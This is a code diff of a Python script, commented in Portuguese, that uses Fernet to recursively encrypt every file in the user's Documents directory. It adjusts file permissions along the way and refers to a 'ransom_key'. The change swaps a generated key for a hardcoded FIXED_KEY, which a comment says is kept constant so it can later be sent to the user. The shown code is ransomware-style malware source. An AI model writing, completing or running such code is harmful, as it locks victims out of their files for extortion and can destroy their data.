@@ -1,9 +1,10 @@
 import os  # Importa o módulo os para interagir com o sistema operacional
 from cryptography.fernet import Fernet 
 
-# Gera a chave
-def generate_key():
-    return Fernet.generate_key()
+
+
+# Define a chave fixa
+FIXED_KEY = 'yYdARKr1Xgo28CKfiY-r-z28f18ix7aSAi9R_ig9caI='
 
 # Define permissões de edição para o arquivo
 def allow_edit(file_path):
@@ -16,6 +17,7 @@ def set_read_only(file_path):
 # Função para encriptar um arquivo
 def encrypt_file(filename, key):
 
+    fernet = Fernet(key);
     # Define permissões de edição
     allow_edit(filename)
 
@@ -32,9 +34,8 @@ def encrypt_file(filename, key):
 
 # Função para encriptar todos os arquivos na diretoria documents
 def encrypt_documents_directory():
-    key = generate_key()  # Gera a chave 
-    with open("ransom_key.key", "wb") as key_file:
-        key_file.write(key)  # Guarda a chave num file
+    key = FIXED_KEY  # Utiliza sempre a mesma chave para que depois seja possível envia-la para o user
+
     documents_directory = os.path.join(os.path.expanduser("~"), "Documents")  # Obtém o caminho para documents
     # Percorre recursivamente a diretoria
     for root, dirs, files in os.walk(documents_directory):
